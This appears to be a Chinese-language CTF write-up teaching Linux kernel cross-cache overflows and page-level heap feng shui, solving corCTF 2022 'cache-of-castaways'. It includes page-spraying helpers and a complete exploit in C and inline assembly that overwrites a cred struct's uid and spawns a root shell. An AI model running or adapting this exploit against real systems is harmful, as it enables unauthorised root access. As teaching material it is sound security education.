---
layout: post
title: 0x07. Linux kernel基础：cross-cache & heap-level heap fengshui
category: kernel pwn
date: 2025-1-9 15:00:00
---

buddy system的利用手法
<!-- more -->

[toc]

# Linux kernel之cross-cache & page-level heap fengshui

## 0x00. 基础知识：为何需要 cross-cache

之前的利用手法基本上是针对`slub allocator`的，但这种手法并不是万能的，例如在`corCTF 2022-cache-of-castaways`这道题目中，题目在常见保护全开的情况下，还开启了`CONFIG_MEMCG_KMEM=y`，并在此基础上给出了一个自定义的`cache`中的`6`字节堆溢出。此时，由于其位于一个独立的`cache`，我们无法使用将其转换为`UAF`来进行结构体复用的思路。

`cross-cache`是一种针对`buddy system`的利用手法。`buddy system` 的分配基础是`page`，每一层的`page`数量比上一层多一倍。当本层的`page`用完后，则取出下一层的所有`pages`，其中一半返回给本次请求的上层调用者，而剩下的一半挂入当前层。如图：

![图来自于https://etenal.me/archives/1825](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images79biltjNfACIZcP.gif)

由此，我们可以得知：当前`order`的`pages`消耗完毕时，`buddy system`将会分配一段物理内存上连续的`pages`给上层调用者和当前`order`。这就使得我们有机会使得我们在私有`cache`上的溢出能够在物理内存上溢出到任何结构体。但很显然这种溢出还需要严苛的页级堆风水，这就需要用到下面的`page-level heap fengshui`来完成后面的操作。

## 0x01. 基础知识：page-level heap fengshui

理想情况下，当我们获得了一片连续的物理内存页，如下`(a)`所示：

![图片1](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images%E5%9B%BE%E7%89%871.png)

假设在`a`我们已经获得了一片连续的物理内存页，此时我们每间隔一页，`free`掉整页，就来到了如图`b`中的情景。

此时，我们将释放掉的内存页面通过申请`victim obj`来全部占用，就来到了如图`c`中的场景。

接下来如法炮制，释放刚刚没有释放的页面，来到如图`d`中的场景。

再将释放的页面通过`vulnerable obj`来申请，就到了如图`e`中的场景。此时，`vulnerable obj`若发生溢出，则在每个`page`相邻处，就有可能可以溢出到`victim obj`，完成`cross-cache`的利用。

注意到，我们上述操作中有对整个页面的申请和释放操作。而这种操作可以利用[CVE-2017-7308](https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html)提供的方式来完成，即使用 `setsockopt` 与 `pgv` 完成页级内存占位与堆风水。这里笔者不多赘述，感兴趣的读者可以参考[arttnba3师傅的博客](https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/#0x0B-pgv-%E4%B8%8E%E9%A1%B5%E7%BA%A7%E5%86%85%E5%AD%98%E9%A1%B5%E5%88%86%E9%85%8D)和[星盟师傅的博客](https://blog.xmcve.com/2023/10/12/Kernel-Heap---Cross-Cache-Overflow)进行详细的了解。此处我们使用`arttnba3`师傅写好的板子，来将其视为一个`api`来进行调用QAQ。

## 0x02. 基础知识：板子一览

我们定义好如下变量和函数：

```c
#define PGV_PAGE_NUM 1000
#define PACKET_VERSION 10
#define PACKET_TX_RING 13

struct tpacket_req
{
    unsigned int tp_block_size;
    unsigned int tp_block_nr;
    unsigned int tp_frame_size;
    unsigned int tp_frame_nr;
};

/* each allocation is (size * nr) bytes, aligned to PAGE_SIZE */
struct page_request {
    int idx;
    int cmd;
};


/* operations type */
enum
{
    CMD_ALLOC_PAGE,
    CMD_FREE_PAGE,
    CMD_EXIT,
};

/* tpacket version for setsockopt */
enum tpacket_versions
{
    TPACKET_V1,
    TPACKET_V2,
    TPACKET_V3,
};

/* pipe for cmd communication */
int cmd_pipe_req[2], cmd_pipe_reply[2];

void unshare_setup(void)
{
    char edit[0x100];
    int tmp_fd;

    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

    tmp_fd = open("/proc/self/setgroups", O_WRONLY);
    write(tmp_fd, "deny", strlen("deny"));
    close(tmp_fd);

    tmp_fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getuid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);

    tmp_fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getgid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);
}


/* create a socket and alloc pages, return the socket fd */
int create_socket_and_alloc_pages(unsigned int size, unsigned int nr)
{
    struct tpacket_req req;
    int socket_fd, version;
    int ret;

    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
    if (socket_fd < 0) {
        printf("[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n");
        ret = socket_fd;
        goto err_out;
    }

    version = TPACKET_V1;
    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, 
                     &version, sizeof(version));
    if (ret < 0) {
        printf("[x] failed at setsockopt(PACKET_VERSION)\n");
        goto err_setsockopt;
    }

    memset(&req, 0, sizeof(req));
    req.tp_block_size = size;
    req.tp_block_nr = nr;
    req.tp_frame_size = 0x1000;
    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;

    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req));
    if (ret < 0) {
        printf("[x] failed at setsockopt(PACKET_TX_RING)\n");
        goto err_setsockopt;
    }

    return socket_fd;

err_setsockopt:
    close(socket_fd);
err_out:
    return ret;
}

/* the parent process should call it to send command of allocation to child */
int alloc_page(int idx)
{
    struct page_request req = {
        .idx = idx,
        .cmd = CMD_ALLOC_PAGE,
    };
    int ret;

    write(cmd_pipe_req[1], &req, sizeof(struct page_request));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));

    return ret;
}


/* the parent process should call it to send command of freeing to child */
int free_page(int idx)
{
    struct page_request req = {
        .idx = idx,
        .cmd = CMD_FREE_PAGE,
    };
    int ret;

    write(cmd_pipe_req[1], &req, sizeof(req));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));

    return ret;
}

/* the child, handler for commands from the pipe */
void spray_cmd_handler(void)
{
    struct page_request req;
    int socket_fd[PGV_PAGE_NUM];
    int ret;

    /* create an isolate namespace*/
    unshare_setup();

    /* handler request */
    do {
        read(cmd_pipe_req[0], &req, sizeof(req));

        if (req.cmd == CMD_ALLOC_PAGE) {
            ret = create_socket_and_alloc_pages(0x1000, 1);
            socket_fd[req.idx] = ret;
        } else if (req.cmd == CMD_FREE_PAGE) {
            ret = close(socket_fd[req.idx]);
        } else {
            printf("[x] invalid request: %d\n", req.cmd);
        }

        write(cmd_pipe_reply[1], &ret, sizeof(ret));
    } while (req.cmd != CMD_EXIT);
}
```

随后，使用时，通过如下方式初始化：

```c
int cmd_pipe_req[2], int cmd_pipe_reply[2];

int main(){
    ...;
    // 初始化
    pipe(cmd_pipe_req);
    pipe(cmd_pipe_reply);
    
    // 创建一个用于 alloc 和 free 页面的子进程
    if(!fork()){
        spray_cmd_handler();
    }
    
}
```

该函数会创建一个子进程，该子进程作为一个服务一直在后台运行。

可以简单地通过`alloc_page`和`free_page`函数来向该服务发送请求，申请或者释放整个页面。

一个`demo`如下：

```c
int cmd_pipe_req[2], int cmd_pipe_reply[2];

int main(){
    ...;
    // 初始化
    pipe(cmd_pipe_req);
    pipe(cmd_pipe_reply);
    
    // 创建一个用于 alloc 和 free 页面的子进程
    if(!fork()){
        spray_cmd_handler();
    }
    
    // 申请三个页面
    for(int i = 0; i < 3; i++){
        alloc_page(i);
    }
    
    // 将三个页面释放
    for(int i = 0; i < 3; i++){
        free_page(i);
    }
    
}
```

## 0x03. corCTF 2022-cache-of-castaways

### 题目信息

题目给出了`kconfig.txt`。除了开启常见的所有保护外，还开启了`CONFIG_MEMCG`，这使得不同`flag`下创建的`obj`将不会合并。

而题目自己手动创建了一个`cache`：

```c
(castaway_cachep = kmem_cache_create("castaway_cache", 0x200LL, 1LL, 0x4040000LL, 0LL)) != 0 )
```

可以看到，创建了一个名为`castaway_cache`的`cache`，且其中的`obj`的大小为`0x200`。新版内核中不同名称的`cache`不再会相互复用，因此题目的`cache`和`kmalloc-512`将为两个不同的`cache`。

题目逻辑很简单，有创建和编辑`obj`两个功能：

```c
__int64 __fastcall castaway_ioctl(__int64 a1, int a2, __int64 a3)
{
  __int64 v3; // r12
  size_t *v5; // rbx
  unsigned __int64 v6[6]; // [rsp+0h] [rbp-30h] BYREF

  v6[3] = __readgsqword(0x28u);
  if ( a2 != 0xCAFEBABE )
  {
    if ( copy_from_user(v6, a3, 0x18LL) )
      return -1LL;
    mutex_lock(&castaway_lock);
    if ( a2 == 0xF00DBABE )
      v3 = castaway_edit(v6[0], v6[1], v6[2]);
    else
      v3 = -1LL;
LABEL_5:
    mutex_unlock(&castaway_lock);
    return v3;
  }
  mutex_lock(&castaway_lock);
  v3 = castaway_ctr;
  if ( castaway_ctr <= 399 )
  {
    ++castaway_ctr;
    v5 = &castaway_arr[v3];
    *v5 = kmem_cache_alloc(castaway_cachep, 0x400DC0LL);
    if ( castaway_arr[v3] )
      goto LABEL_5;
  }
  return castaway_ioctl_cold();
}
```

其中，编辑`obj`的过程中，出题人特意给出了一个`6`字节的溢出：

```c
__int64 __fastcall castaway_edit(unsigned __int64 index, size_t size, size_t content)
{
  unsigned __int64 v3; // r12
  size_t size__; // rbx
  size_t size_; // rdx
  _BYTE src[512]; // [rsp+0h] [rbp-220h] BYREF
  unsigned __int64 v9; // [rsp+200h] [rbp-20h]

  v9 = __readgsqword(0x28u);
  if ( index > 0x18F )
    return castaway_edit_cold(index, size, content);
  v3 = index;
  if ( !castaway_arr[index] )
    return castaway_edit_cold(index, size, content);
  size__ = size;
  if ( size > 0x200 )
    return castaway_edit_cold(index, size, content);
  _check_object_size(src, size, 0LL);
  size_ = size;
  size = content;
  index = (unsigned __int64)src;
  if ( copy_from_user(src, content, size_) )
    return castaway_edit_cold(index, size, content);
  memcpy((void *)(castaway_arr[v3] + 6), src, size__);
  return size__;
}
```

而这里，由于`cache`的隔离，我们无法通过该堆溢出来溢出到任何可用的结构体，又由于不知道任何地址，因此也无法简单地利用`freelist`来进行劫持。因此，我们这里需要一种`cross-cache`的利用方法。

### 解题思路概览

这里，我们若能够完成`cross-cache`的溢出，则不难想到可以让`6`字节溢出到别的结构体，而最简单的方法就是溢出到`cred`结构体。其定义如下：

```c
struct cred {
    atomic_t usage;                  /* 引用计数 */
    kuid_t uid;                      /* 有效用户 ID */
    kgid_t gid;                      /* 有效组 ID */
    kuid_t suid;                     /* 保存的用户 ID */
    kgid_t sgid;                     /* 保存的组 ID */
    kuid_t euid;                     /* 有效用户 ID */
    kgid_t egid;                     /* 有效组 ID */
    kuid_t fsuid;                    /* 文件系统用户 ID */
    kgid_t fsgid;                    /* 文件系统组 ID */
    unsigned securebits;             /* 安全位 */
    kernel_cap_t cap_inheritable;    /* 可继承能力 */
    kernel_cap_t cap_permitted;      /* 被允许的能力 */
    kernel_cap_t cap_effective;      /* 生效的能力 */
    kernel_cap_t cap_bset;           /* 能力的边界集合 */
    kernel_cap_t cap_ambient;        /* 环境能力 */
    struct user_struct *user;        /* 与用户相关的结构 */
    struct group_info *group_info;   /* 组信息 */
    struct key *session_keyring;     /* 会话密钥环 */
    struct key *process_keyring;     /* 进程密钥环 */
    struct key *thread_keyring;      /* 线程密钥环 */
    struct key *request_key_auth;    /* 请求密钥认证 */
#ifdef CONFIG_SECURITY
    void *security;                  /* 安全模块相关的私有数据 */
#endif
#ifdef CONFIG_KEYS
    struct key *user_keyring;        /* 用户密钥环 */
    struct key *user_ns_keyring;     /* 用户命名空间密钥环 */
#endif
    struct rcu_head rcu;             /* 用于 RCU（读取-复制-更新）回收 */
};
```

若我们能够溢出到某个子进程的`cred`结构体，并覆盖其`uid`为`0`，则该子进程就会表现出`root`权限的状态。需要注意引用计数不能为`0`。

而溢出到该结构体的方法也就是`cross-cache`的打法了。考虑如下流程：

- 首先，利用`fork()`来消耗当前`cred`的`slab`中剩余的`cred obj`。由于一个`slab`中默认有`21`个`cred obj`，那么我们只需要创建大约`35`个子进程即可以用来消耗当前`cred`属于的`slab`。
- 利用上面提到的方法大量喷射`pages`，即申请大量的页面以备用。在这个过程中，由于当前的`slub`的`pages`被消耗完毕，因此会从`buddy system`来申请物理地址上连续的内存页。
- 随后，释放奇数即`1、3、5、7、9...`的页面，并通过`clone`系统调用来大量创建子进程，从而在子进程创建时申请`cred obj`来占用刚刚释放的奇数页面。
- 释放偶数即`0、2、4、6、8...`的页面，并通过题目功能，申请题目的`obj`（称之为`vulnerable obj`），并编辑该申请到的`obj`使其溢出`6`个字节。
- 在偶数页面和奇数页面相邻处，偶数页面上的`vulnerable obj`便有可能溢出到奇数页面上的`cred obj`。在溢出时设置溢出的`uid`为`0`，同时保持引用计数`usage`不为`0`，即可让该`cred obj`对应的子进程的用户权限变为`root`。我们让该变为`root`的子进程使用`execve`来启动一个`shell`即可。

### 使用clone创建子进程

在上述过程中，我们提到使用`clone`来创建子进程，从而申请`cred`结构体。有的师傅可能注意到，这里并没有使用`fork`来进行申请，而是使用了不太常见的`clone`。这是因为`fork`过程中会申请很多的`obj`来干扰到堆块，称之为“噪声”。因此我们选用`clone`来进行子进程的创建。

而`clone()`过程中，也并不是不会产生噪声——会产生，而且根据其参数不同，执行的分支不同，产生的噪声也不相同。这里我们选择一个噪声最少的分支，即使用如下参数（标志位）来调用`clone()`：

```c
CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND
```

而该分支会创建的`obj`如下，共有`4`个`order 0`的`obj`：

```c
task_struct
kmalloc-64
vmap_area
vmap_area
cred_jar
signal_cache
pid
```

而当设置了`CLONE_VM`这个标志位时，子进程和父进程的内存会共享：这意味着子进程若调用函数，很可能会影响父进程的执行状态。因此在子进程中执行的函数中，我们要完全使用`shellcode`来编写。

### 子进程检查是否获得 root 权限

通过`clone()`产生的子进程需要时刻注意自己是否已经获得了`root`权限。通过轮询来检查自己是否获得`root`权限显然不够优雅，因此可以利用`pipe`管道来实现该功能。每个子进程都使用`read(check_root_pipe[0], child_buf, 1);`这样的方式来从管道中读取一个字节的内容，而管道中没有数据时，其属于阻塞状态。当整个流程执行完毕时，我们只需要向管道另一侧写入数据，即可触发子进程检查自己的`uid`的流程。

例如一个示例如下：

```c
int waiting_for_root_fn(void)
{
    /**
     * 执行如下代码：
     * read(check_root_pipe, child_pipe_buf, 1);
     * if(getuid() == 0){
     *     write(1, root_str, 0x20);
     *     execve("/bin/sh", shell_args, 0);
     * }else{
     *     write(1, failed_str, 0x20);
     *     exit(-6);
     * }
     */
    __asm__ volatile(
        "lea rax, [check_root_pipe];"
        "xor rdi, rdi;"
        "mov edi, dword ptr[rax];"
        "xor eax, eax;"
        "lea rsi, [child_pipe_buf];"
        "mov rdx, 1;"
        "syscall;" // read(check_root_pipe[0], child_pipe_buf, 1);
        "mov rax, 102;"
        "syscall;" // getuid();
        "cmp rax, 0;"
        "jne go;"
        "mov rax, 1;"
        "mov rdi, 1;"
        "lea rsi, [root_str];"
        "mov rdx, 0x50;"
        "syscall;" // write(1, root_str, 0x60);
        "mov rax, 59;"
        "lea rdi, [bin_sh_str];"
        "lea rsi, [shell_args];"
        "mov rdx, 0;"
        "syscall;" // execve("/bin/sh\x00", shell_args, NULL);
        "go:"
        "lea rdi, [ts];"
        "xor rsi, rsi;"
        "mov rax, 35;"
        "syscall;" // sleep();

    );
}
```

### 解题脚本

带注释的`exp`如下：

```c
#include "ltfallkernel.h"

#define ADD 0xCAFEBABE
#define EDIT 0xF00DBABE

#define VULN_OBJ_SIZE 512
#define VULN_SPRAY_NUM 400

#define CRED_INITIAL_NUM 30
#define CRED_SPRAY_NUM 1066

struct request
{
    long index;
    long size;
    char *content;
};

struct timespec ts = {
    .tv_sec = 0x1000000,
    .tv_nsec = 0};

int dev_fd;
int cmd_pipe_req[2], cmd_pipe_reply[2], check_root_pipe[2];
char bin_sh_str[] = "/bin/sh";
char *shell_args[] = {bin_sh_str, NULL};
char child_pipe_buf[1];
char root_str[] = "\033[32m\033[1m[+] Successful to get the root.\n"
                  "\033[34m[*] Execve root shell now...\033[0m\n";
char failed_str[] = "Failed to win.\n";
char failed_clone_str[] = "Failed to clone.\n";
char prompt_str[] = "Get info.\n";

void alloc(){
    ioctl(dev_fd, ADD);
}

void edit(long index, long size, char* content){
    struct request* t = (struct request*)malloc(sizeof(struct request));
    t->index = index;
    t->size = size;
    t->content = content;
    ioctl(dev_fd, EDIT, t);
}


int __attribute__((naked)) simple_clone(int flags, int (*fn)(void))
{
    /**
     * return: status
     * rdi: clone flags
     * rsi: func for child process to execute
     */
    __asm__ volatile(
        "mov r15, rsi;"
        "xor esi, esi;"
        "xor edx, edx;"
        "xor ecx, ecx;"
        "xor r8, r8;"
        "xor r9, r9;"
        "xor r10, r10;"
        "xor r14, r14;"
        "mov rax, 56;"
        "syscall;"
        "cmp rax, 0;"
        "jl failed;"
        "cmp rax, 0;"
        "je child;"
        "ret;"
        "failed:"
        "mov rax, 1;"
        "mov rdi, 1;"
        "mov rdx, 17;"
        "lea rsi, failed_clone_str;"
        "syscall;"
        "mov rax, 60;"
        "mov rdi, -5;"
        "syscall;"
        "child:"
        "jmp r15;");
}

int waiting_for_root_fn(void)
{
    /**
     * 执行如下代码：
     * read(check_root_pipe, child_pipe_buf, 1);
     * if(getuid() == 0){
     *     write(1, root_str, 0x20);
     *     execve("/bin/sh", shell_args, 0);
     * }else{
     *     write(1, failed_str, 0x20);
     *     exit(-6);
     * }
     */
    __asm__ volatile(
        "lea rax, [check_root_pipe];"
        "xor rdi, rdi;"
        "mov edi, dword ptr[rax];"
        "xor eax, eax;"
        "lea rsi, [child_pipe_buf];"
        "mov rdx, 1;"
        "syscall;" // read(check_root_pipe[0], child_pipe_buf, 1);
        "mov rax, 102;"
        "syscall;" // getuid();
        "cmp rax, 0;"
        "jne go;"
        "mov rax, 1;"
        "mov rdi, 1;"
        "lea rsi, [root_str];"
        "mov rdx, 0x50;"
        "syscall;" // write(1, root_str, 0x60);
        "mov rax, 59;"
        "lea rdi, [bin_sh_str];"
        "lea rsi, [shell_args];"
        "mov rdx, 0;"
        "syscall;" // execve("/bin/sh\x00", shell_args, NULL);
        "go:"
        "lea rdi, [ts];"
        "xor rsi, rsi;"
        "mov rax, 35;"
        "syscall;"

    );
}

int main(int aragc, char **argv, char **envp)
{   
    char buffer[0x1000];

    cpu_set_t cpu_set;
    char th_stack[0x1000], buf[0x1000];

    /* to run the exp on the specific core only */
    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    info("Starting to exploit...");
    dev_fd = open("/dev/castaway", O_RDWR);
    if (dev_fd < 0)
    {
        err_exit("Failed to open device.");
    }

    /**
     * 整理思路。
     * 1. 首先，我们简单地通过fork来消耗掉当前的cred结构体。
     * 2. 接下来，我们喷射大量页面。在这个过程中，若 order 0 页面被消耗完毕时，其会向buddy system请求页面，从而获得连续的页面.
     * 3. 随后，释放奇数位置的页面，并将其占用为 cred 结构体
     * 4. 最后，释放偶数位置的页面，并将其占用为 vulnerable obj
     */

    /**
     * 0x00. 通过fork消耗当前结构体
     */
    for (int i = 0; i < CRED_INITIAL_NUM; i++)
    {
        pid_t p_t;
        p_t = fork();
        if (!p_t)
        {
            sleep(0x100000);
        }
        else if (p_t < 0)
        {
            err_exit("Failed to spary cred at initial.");
        }
    }

    /**
     * 0x01. 喷射大量 pages
     */
    info("Preparing for praying pages...");

    // 初始化
    pipe(cmd_pipe_req);
    pipe(cmd_pipe_reply);

    if (!fork())
    {
        spray_cmd_handler();
    }

    info("Allocating pages...");
    for (int i = 0; i < PGV_PAGE_NUM; i++)
    {
        if (alloc_page(i) < 0)
        {
            error("Failed to alloc page when idx=%d.", i);
            exit(-1);
        }
    }

    /**
     * 0x02. 释放奇数位置的页面，并将其占用为 cred 结构体
     */

    // 释放奇数位置的页面
    info("Freeing pages for cred...");
    for (int i = 1; i < PGV_PAGE_NUM; i += 2)
    {
        if (free_page(i) < 0)
        {
            error("Failed to free page when idx=%d.", i);
            exit(-2);
        }
    }

    // 将其占用为 cred 结构体
    info("Allocating for cred obj..");
    pipe(check_root_pipe);
    for (int i = 0; i < CRED_SPRAY_NUM; i++)
    {
        if (simple_clone(CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND, waiting_for_root_fn) < 0)
        {
            error("Failed to simple_clone when idx=%d.", i);
            exit(-3);
        }
    }

    /**
     * 0x03. 释放偶数位置的页面，并将其占用为vulnrable obj.
     */

    // 释放 pages
    info("Freeing pages for vuln obj...");
    for (int i = 0; i < PGV_PAGE_NUM; i += 2)
    {
        free_page(i);
    }

    // 占"用 pages 为 vulnerable obj
    info("Allocating for vuln obj...");
    memset(buffer, 0, 0x1000);
    *(uint32_t*)(&buffer[VULN_OBJ_SIZE - 6]) = 1;
    for (int i = 0; i < VULN_SPRAY_NUM; i++)
    {
        alloc();
        edit(i, VULN_OBJ_SIZE, buffer);
    }

    info("Should being root...");
    write(check_root_pipe[1], buffer, CRED_SPRAY_NUM);
    sleep(0x100000);
    return 0;
}
```



## 0x04. 常见问题

### 我如何知道某个`obj`位于哪个`order`？

查看`/proc/slabinfo`中的`pagesperslab`字段。若其值为`1`，很明显其位于`order 0 `，其值为`2`则位于`order 1`以此类推。

### 为什么子进程检查是否获得`root`的函数要使用`shellcode`来编写？

这是因为该子进程是和父进程共享内存的。若子进程修改了父进程的内存，则可能导致父进程执行出错。因此，子进程这里的函数使用纯基于寄存器的`shellcode`来完成，便不会影响到父进程的内存。

### 获得`shell`后，程序寄掉了。

这里在子进程中获得`shell`后，还需要在后面让该子进程`sleep`，否则子进程继续执行其他内容会出错。

### 我如何知道宏定义中，每种`obj`需要喷射的数量？

这里，笔者的计算方式如下：

- 对于`cred`初始状态下将其消耗的数量，我们查看`/proc/slabinfo`，得知需要消耗`21`以上的该`obj`。经过测试这个数量需要略大于一些，例如设置为`30-35`才比较稳妥。
- 对于`cred obj`喷射的数量，我的计算方式如下：题目提供的`obj`大小为`0x200`，而可以喷射的数量为`400`；因此，我们需要使得喷射的`cred obj`占满的页面数量和题目`obj`占满的页面数量差不多大才可以尽可能大概率地溢出到`cred`。因此，简单地让`cred`结构体占用的大小和题目`obj`的大小差不多就可以了。计算方式为：`(0x200 * 400) / 192 ≈ 1066`。

## 0x05. 参考

[arttnba3师傅的博客](https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x09-Kernel-Heap-Cross-Cache-Overflow-Page-level-Heap-Fengshui)

[xmcve的博客](https://blog.xmcve.com/2023/10/12/Kernel-Heap---Cross-Cache-Overflow)

[【Exploit trick】针对cred结构的cross cache利用 — bsauce](https://bsauce.github.io/2022/11/07/castaways/#exploit-trick针对cred结构的cross-cache利用corctf-2022-cache-of-castaways)